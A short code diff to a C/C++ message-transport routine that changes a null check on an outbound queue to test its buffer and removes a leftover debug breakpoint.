@@ -119,7 +119,7 @@ namespace Message {
         PSTREAM Head        = { };
         PSTREAM Swap        = { };
 
-        if (!Ctx->Transport.OutboundQueue) {
+        if (!Ctx->Transport.OutboundQueue->Buffer) {
 
 #ifdef TRANSPORT_HTTP
             // PackDword(Outbound, 0);
@@ -130,7 +130,6 @@ namespace Message {
             return_defer(ERROR_SUCCESS);
 #endif
         }
-        __debugbreak();
         Head = Ctx->Transport.OutboundQueue;
 
         while (Head) {
